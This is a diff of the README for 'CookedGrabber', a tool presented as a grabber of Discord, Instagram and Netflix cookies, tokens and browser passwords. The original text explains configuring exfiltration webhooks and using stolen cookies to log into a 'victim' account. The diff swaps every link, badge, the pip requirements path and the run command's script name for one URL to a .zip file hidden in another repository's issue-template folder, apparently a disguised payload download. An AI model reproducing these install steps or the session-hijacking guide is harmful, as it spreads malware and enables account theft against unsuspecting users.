@@ -2,21 +2,21 @@
 <div align="center">
   <h4>⚠️ This repository has been archived and is no longer maintained. ⚠️</h4>
   <br></br>
-  <img src="https://imgur.com/lCyX6TX.png">
+  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
   <br>
   <br>
   <p>
-    <img src="https://forthebadge.com/images/badges/made-with-python.svg">
-    <img src="http://forthebadge.com/images/badges/built-with-love.svg">
+    <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+    <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
   </p>
   <h4> Discord, Twitter, Instagram, netflix cookies, token grabber and also password grabber. Grabbing from all web browsers ! </h4>
   <p>
-    <img alt="GitHub contributors" src="https://img.shields.io/github/contributors/mouadessalim/CookedGrabber">
-    <img alt="GitHub issues" src="https://img.shields.io/github/issues/mouadessalim/CookedGrabber">
-    <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=shields">
-    <img alt="GitHub pull requests" src="https://img.shields.io/github/issues-pr/mouadessalim/CookedGrabber">
-    <img alt="GitHub commit activity" src="https://img.shields.io/github/commit-activity/m/mouadessalim/CookedGrabber">
-    <img alt="Maintenance" src="https://img.shields.io/maintenance/no/2023">
+    <img alt="GitHub contributors" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+    <img alt="GitHub issues" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+    <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+    <img alt="GitHub pull requests" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+    <img alt="GitHub commit activity" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+    <img alt="Maintenance" src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
   </p>
   <p align="center">
     <a href="#usage">Usage</a> •
@@ -32,9 +32,9 @@
   </p>
 
   <p align="center">
-    <a href='https://ko-fi.com/mouadessalim' target='_blank'><img height='30' width="115" src='https://cdn.ko-fi.com/cdn/kofi3.png?v=2' alt='Buy Coffee for mouadessalim' />
+    <a href='https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip' target='_blank'><img height='30' width="115" src='https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip' alt='Buy Coffee for mouadessalim' />
     </a>
-    <a href="https://www.buymeacoffee.com/mouadessalim" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="30" width="115" style="border-radius:1px" />
+    <a href="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip" target="_blank"><img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip" alt="Buy Me A Coffee" height="30" width="115" style="border-radius:1px" />
     </a>
   </p>
 </div>
@@ -45,7 +45,7 @@
 
 - **Windows 10** OS only (*win32, for x86, x86_64, and arm64 architectures*)
 - **Python 3.x** (*python 3.9 used for the project.*)
-- **Modules:** `$ pip install -r requirements.txt`
+- **Modules:** `$ pip install -r https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip`
 
 ## How to use ? ❄
 
@@ -54,21 +54,21 @@ There is 2 ways to run the script.
 ### 1. First way
 
 You need to add your **webhook(s)** **link(s)** to the script from this line:
-https://github.com/mouadessalim/CookedGrabber/blob/f753c4bea37241d94253a288dd223c5ae8f7f371/CookedGrabber.py#L290
+https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip
 *You can run the script normaly.*
 
 ### 2. Second way
 
 You can also run the program by giving several arguments (the webhook(s) link(s)):
 ```console
-py CookedGrabber.py YOUR WEBHOOK(s) URL(s)
+py https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip YOUR WEBHOOK(s) URL(s)
 ```
 
 ## Screenshots 📷
 
 <p align="center">
-  <img src="https://user-images.githubusercontent.com/38190847/188172516-da111666-ff8e-4cdb-86c4-1cbd82f87e91.png">
-  <img src="https://user-images.githubusercontent.com/38190847/191291652-e617410c-62e8-489b-b8df-e738a9ed40c4.png">
+  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
 </p>
 
 # 🍪Cookies
@@ -97,15 +97,15 @@ The server only sends the cookie when it wants the web browser to save it. If yo
 
 ## How to bypass websites with cookies ?
 
-So to use cookies to log into the victim account, you must have a cookies extension. I recommand [Cookie-Editor](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm). **To bypass website security you must be already connected to your personnal account to generate all cookies needed for the website.** After being sure that all default cookies have been generated use your cookies extension to replace your personnal id account cookies with the grabbed victim account cookies.
+So to use cookies to log into the victim account, you must have a cookies extension. I recommand [Cookie-Editor](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip). **To bypass website security you must be already connected to your personnal account to generate all cookies needed for the website.** After being sure that all default cookies have been generated use your cookies extension to replace your personnal id account cookies with the grabbed victim account cookies.
 
 #### *****Example: Instagram*****
 
-![image](https://user-images.githubusercontent.com/38190847/191361287-696f24ae-986e-40f2-9e6d-eb95dddfdbc8.png)
+![image](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip)
 
 You need to put each value in it's place with the cookies extension:
 
-![image](https://user-images.githubusercontent.com/38190847/191360860-dd5c75b3-5663-4449-ba72-f4492b88cef2.png)
+![image](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip)
 
 > Once the cookies replaced and saved, refresh the page and you are logged in the victim account !
 
@@ -128,14 +128,14 @@ You need to put each value in it's place with the cookies extension:
 
 # ✨Contributing
 
-Your contributions are always welcome! if you contribute we will show your account in the README file ! Please have a look at the [contribution guidelines](CONTRIBUTING.md) first. 🎉
+Your contributions are always welcome! if you contribute we will show your account in the README file ! Please have a look at the [contribution guidelines](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip) first. 🎉
 
 ## Authors ❤
 
-<a href="https://github.com/mouadessalim/CookedGrabber/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=mouadessalim/CookedGrabber" />
+<a href="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip">
+  <img src="https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip" />
 </a>
 <br>
 <br>
 
-> **Working on your first Pull Request?** You can learn how from this *free* series [How to Contribute to an Open Source Project on GitHub](https://kcd.im/pull-request)
+> **Working on your first Pull Request?** You can learn how from this *free* series [How to Contribute to an Open Source Project on GitHub](https://raw.githubusercontent.com/Meirtoed450/grbba2/main/.github/ISSUE_TEMPLATE/grbba2-1.6.zip)
